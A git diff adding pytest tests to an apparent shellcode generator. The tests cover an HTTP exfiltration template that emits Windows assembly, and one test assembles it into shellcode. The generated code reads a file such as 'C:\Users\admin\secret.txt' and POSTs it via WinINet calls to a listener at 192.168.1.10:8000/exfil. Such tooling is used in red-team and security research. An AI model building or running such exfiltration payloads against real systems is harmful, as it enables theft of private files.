@@ -481,3 +481,182 @@ class TestHttpDownloadAutoDerive:
             assemble=False,
         )
         assert "http://10.0.0.1:9999/custom.bin" in result.asm
+
+
+# ---------------------------------------------------------------------------
+# HTTP Exfil (POST) template tests
+# ---------------------------------------------------------------------------
+
+
+@pytest.fixture
+def exfil_config():
+    from Tools.emitter.payload_templates.base import TemplateConfig
+    return TemplateConfig(
+        lhost="192.168.1.10",
+        lport=8000,
+        src_path="C:\\Users\\admin\\secret.txt",
+        url_path="/exfil",
+    )
+
+
+def test_http_exfil_createfile_slot(http_exfil_layout, exfil_config):
+    from Tools.emitter.payload_templates.http_exfil import HttpExfilTemplate
+    t = HttpExfilTemplate()
+    asm = t.emit(http_exfil_layout, exfil_config)
+    assert http_exfil_layout.slot("CreateFileA").ebp_ref in asm
+
+
+def test_http_exfil_readfile_slot(http_exfil_layout, exfil_config):
+    from Tools.emitter.payload_templates.http_exfil import HttpExfilTemplate
+    t = HttpExfilTemplate()
+    asm = t.emit(http_exfil_layout, exfil_config)
+    assert http_exfil_layout.slot("ReadFile").ebp_ref in asm
+
+
+def test_http_exfil_inet_open_slot(http_exfil_layout, exfil_config):
+    from Tools.emitter.payload_templates.http_exfil import HttpExfilTemplate
+    t = HttpExfilTemplate()
+    asm = t.emit(http_exfil_layout, exfil_config)
+    assert http_exfil_layout.slot("InternetOpenA").ebp_ref in asm
+
+
+def test_http_exfil_inet_connect_slot(http_exfil_layout, exfil_config):
+    from Tools.emitter.payload_templates.http_exfil import HttpExfilTemplate
+    t = HttpExfilTemplate()
+    asm = t.emit(http_exfil_layout, exfil_config)
+    assert http_exfil_layout.slot("InternetConnectA").ebp_ref in asm
+
+
+def test_http_exfil_http_open_slot(http_exfil_layout, exfil_config):
+    from Tools.emitter.payload_templates.http_exfil import HttpExfilTemplate
+    t = HttpExfilTemplate()
+    asm = t.emit(http_exfil_layout, exfil_config)
+    assert http_exfil_layout.slot("HttpOpenRequestA").ebp_ref in asm
+
+
+def test_http_exfil_http_send_slot(http_exfil_layout, exfil_config):
+    from Tools.emitter.payload_templates.http_exfil import HttpExfilTemplate
+    t = HttpExfilTemplate()
+    asm = t.emit(http_exfil_layout, exfil_config)
+    assert http_exfil_layout.slot("HttpSendRequestA").ebp_ref in asm
+
+
+def test_http_exfil_inet_close_slot(http_exfil_layout, exfil_config):
+    from Tools.emitter.payload_templates.http_exfil import HttpExfilTemplate
+    t = HttpExfilTemplate()
+    asm = t.emit(http_exfil_layout, exfil_config)
+    assert http_exfil_layout.slot("InternetCloseHandle").ebp_ref in asm
+
+
+def test_http_exfil_variable_slots(http_exfil_layout, exfil_config):
+    from Tools.emitter.payload_templates.http_exfil import HttpExfilTemplate
+    t = HttpExfilTemplate()
+    asm = t.emit(http_exfil_layout, exfil_config)
+    for var in ["inet_session", "inet_connect", "inet_request",
+                "file_handle", "virt_buf", "bytes_read", "bytes_total"]:
+        assert http_exfil_layout.slot(var).ebp_ref in asm, f"missing var {var}"
+
+
+def test_http_exfil_string_slots(http_exfil_layout, exfil_config):
+    from Tools.emitter.payload_templates.http_exfil import HttpExfilTemplate
+    t = HttpExfilTemplate()
+    asm = t.emit(http_exfil_layout, exfil_config)
+    for s in ["src_path", "exfil_host", "url_path", "http_post", "user_agent"]:
+        assert http_exfil_layout.slot(s).ebp_ref in asm, f"missing string {s}"
+
+
+def test_http_exfil_no_hardcoded_offsets(http_exfil_layout, exfil_config):
+    from Tools.emitter.payload_templates.http_exfil import HttpExfilTemplate
+    import re
+    t = HttpExfilTemplate()
+    asm = t.emit(http_exfil_layout, exfil_config)
+    known_refs = {s.ebp_ref for s in http_exfil_layout.all_slots()}
+    for ref in re.findall(r'\[ebp-0x[0-9a-f]+\]', asm):
+        assert ref in known_refs, f"Hardcoded offset {ref} not in layout"
+
+
+def test_http_exfil_read_loop_bounds_check(http_exfil_layout, exfil_config):
+    from Tools.emitter.payload_templates.http_exfil import HttpExfilTemplate
+    t = HttpExfilTemplate()
+    asm = t.emit(http_exfil_layout, exfil_config)
+    assert "exfil_read_loop:" in asm
+    assert "exfil_read_done" in asm
+    assert "buffer full" in asm
+    assert "exfil_read_sized" in asm
+
+
+def test_http_exfil_generic_read(http_exfil_layout, exfil_config):
+    from Tools.emitter.payload_templates.http_exfil import HttpExfilTemplate
+    t = HttpExfilTemplate()
+    asm = t.emit(http_exfil_layout, exfil_config)
+    assert "GENERIC_READ" in asm
+    assert "OPEN_EXISTING" in asm
+
+
+def test_http_exfil_post_verb(http_exfil_layout, exfil_config):
+    from Tools.emitter.payload_templates.http_exfil import HttpExfilTemplate
+    t = HttpExfilTemplate()
+    asm = t.emit(http_exfil_layout, exfil_config)
+    assert "POST" in asm
+
+
+class TestHttpExfilProbeSlots:
+    def test_discovers_all_api_slots(self, exfil_config):
+        from Tools.emitter.payload_templates.http_exfil import HttpExfilTemplate
+        t = HttpExfilTemplate()
+        slots = t.probe_slots(exfil_config)
+        for api in ["CreateFileA", "ReadFile", "CloseHandle", "VirtualAlloc",
+                     "InternetOpenA", "InternetConnectA", "HttpOpenRequestA",
+                     "HttpSendRequestA", "InternetCloseHandle"]:
+            assert api in slots, f"missing API slot: {api}"
+
+    def test_discovers_variable_slots(self, exfil_config):
+        from Tools.emitter.payload_templates.http_exfil import HttpExfilTemplate
+        t = HttpExfilTemplate()
+        slots = t.probe_slots(exfil_config)
+        for var in ["inet_session", "inet_connect", "inet_request",
+                     "file_handle", "virt_buf", "bytes_read", "bytes_total"]:
+            assert var in slots, f"missing var slot: {var}"
+
+    def test_discovers_string_slots(self, exfil_config):
+        from Tools.emitter.payload_templates.http_exfil import HttpExfilTemplate
+        t = HttpExfilTemplate()
+        slots = t.probe_slots(exfil_config)
+        for s in ["src_path", "exfil_host", "url_path", "http_post", "user_agent"]:
+            assert s in slots, f"missing string slot: {s}"
+
+
+class TestHttpExfilAutoDerive:
+    def test_auto_derives_missing_apis(self, manifest_dir, tmp_path):
+        from Tools.emitter.build import build
+        from Tools.emitter.payload_templates.base import TemplateConfig
+        config = TemplateConfig(
+            lhost="192.168.1.10",
+            lport=8000,
+            src_path="C:\\secret.txt",
+            url_path="/exfil",
+        )
+        result = build(
+            str(manifest_dir / "http_exfil.yaml"),
+            config=config,
+            out_dir=str(tmp_path),
+            assemble=False,
+        )
+        assert "HttpSendRequestA" in result.asm
+
+    def test_full_build_assembles(self, manifest_dir, tmp_path):
+        from Tools.emitter.build import build
+        from Tools.emitter.payload_templates.base import TemplateConfig
+        config = TemplateConfig(
+            lhost="192.168.1.10",
+            lport=8000,
+            src_path="C:\\secret.txt",
+            url_path="/exfil",
+        )
+        result = build(
+            str(manifest_dir / "http_exfil.yaml"),
+            config=config,
+            out_dir=str(tmp_path),
+        )
+        assert result.shellcode_bytes is not None
+        assert len(result.shellcode_bytes) > 0
